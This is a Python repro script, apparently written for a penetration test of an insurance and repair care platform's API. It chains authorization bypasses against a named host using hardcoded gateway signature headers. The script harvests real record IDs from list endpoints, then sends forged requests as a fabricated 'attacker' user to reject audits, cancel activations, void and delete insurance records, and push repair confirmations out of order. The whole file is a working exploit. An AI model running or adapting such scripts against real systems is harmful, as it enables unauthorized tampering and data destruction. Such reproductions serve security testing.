#!/usr/bin/env python3
"""
Pure API repro script for confirmed chains in test environment.

Usage:
  python3 target/work/repro_api_chain.py
"""

import json
import re
import ssl
import urllib.error
import urllib.request
import uuid

BASE = "https://test-care.dbeta.me"
H = {
    "Nonce-Gw-S": "511726",
    "Timestamp-Gw-S": "1783579833308",
    "Sign-Gw-S": "53a690a8ec201207bbfe7f904613085a",
    "User-Agent": "repro-api-chain/1.0",
    "Accept": "*/*",
    "Content-Type": "application/json",
}

CTX = ssl.create_default_context()


def post(path, body, headers=None):
    hdr = dict(H)
    if headers:
        hdr.update(headers)
    req = urllib.request.Request(
        BASE + path,
        method="POST",
        headers=hdr,
        data=json.dumps(body, ensure_ascii=False).encode("utf-8"),
    )
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=20) as resp:
            code = resp.getcode()
            text = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        code = e.code
        text = e.read().decode("utf-8", errors="replace")
    app = None
    m = re.search(r'"(?:code|Code)"\s*:\s*([0-9-]+)', text)
    if m:
        app = m.group(1)
    return code, app, text


def get_list_rows(path):
    body = {
        "pageSize": 20,
        "currentPage": 1,
        "searchValue": "",
        "sortField": "",
        "orderType": True,
        "isPage": True,
        "isPageSizeOutOfLimit": True,
        "searchModel": {},
    }
    code, app, text = post(path, body)
    rows = []
    try:
        rows = json.loads(text).get("value", {}).get("rows", [])
    except Exception:
        pass
    return code, app, rows


def main():
    attacker = str(uuid.uuid4())
    print(f"[+] attacker uid: {attacker}")

    # 1) Real ID from audit list, then forged audit write
    _, _, audit_rows = get_list_rows("/api/v1/BaseConfig/CareAuditSnSearchPage")
    if audit_rows:
        target_id = audit_rows[0]["id"]
        print(f"[+] audit target id: {target_id}")
        code, app, _ = post(
            "/api/v1/BaseConfig/CareAuditSnAuditing",
            {
                "userId": attacker,
                "userAd": "attacker",
                "id": target_id,
                "craftSN": "x",
                "cameraSN": "x",
                "status": 2,
                "handleComment": "repro attacker reject",
            },
        )
        print(f"    audit write => HTTP {code}, app_code {app}")

    # 2) Real ID from activation list, then operation write
    _, _, act_rows = get_list_rows("/api/v1/ActivationManager/ActivationList")
    if act_rows:
        target_id = act_rows[0]["id"]
        print(f"[+] activation target id: {target_id}")
        code, app, _ = post(
            "/api/v1/ActivationManager/ActivationOperation",
            {
                "userId": attacker,
                "userAd": "attacker",
                "id": target_id,
                "operaType": 1,
                "cancelReason": "repro attacker cancel",
            },
        )
        print(f"    activation op => HTTP {code}, app_code {app}")

    # 3) Real ID from actpush list, then void + delete
    _, _, push_rows = get_list_rows("/api/v1/ActPushInsuranceInfo/LoadActPushInsurancePageList")
    if push_rows:
        target_id = push_rows[0]["id"]
        print(f"[+] actpush target id: {target_id}")
        code, app, _ = post(
            "/api/v1/ActPushInsuranceInfo/ActPushInsuranceToVoid",
            {
                "userId": attacker,
                "userAd": "attacker",
                "id": target_id,
                "remark": "repro attacker void",
            },
        )
        print(f"    actpush void => HTTP {code}, app_code {app}")
        code, app, _ = post(
            "/api/v1/ActPushInsuranceInfo/Delete",
            {"ids": [target_id], "paramOk": True},
        )
        print(f"    actpush delete => HTTP {code}, app_code {app}")

    # 4) Real repair IDs, confirm-before-review sequence
    _, _, repair_rows = get_list_rows("/api/v1/Repair/LoadRepairInfo")
    if repair_rows:
        r = repair_rows[0]
        iid = r.get("insuranceId")
        rid = r.get("id")
        print(f"[+] repair pair: insuranceId={iid}, repairId={rid}")
        code, app, _ = post(
            "/api/v1/Repair/RepairRebackConfirm",
            {
                "userId": attacker,
                "userAd": "attacker",
                "insuranceId": iid,
                "repairId": rid,
            },
        )
        print(f"    confirm-first => HTTP {code}, app_code {app}")
        code, app, _ = post(
            "/api/v1/Repair/ReviewRepairReback",
            {
                "userId": attacker,
                "userAd": "attacker",
                "insuranceId": iid,
                "repairId": rid,
            },
        )
        print(f"    review-second => HTTP {code}, app_code {app}")


if __name__ == "__main__":
    main()
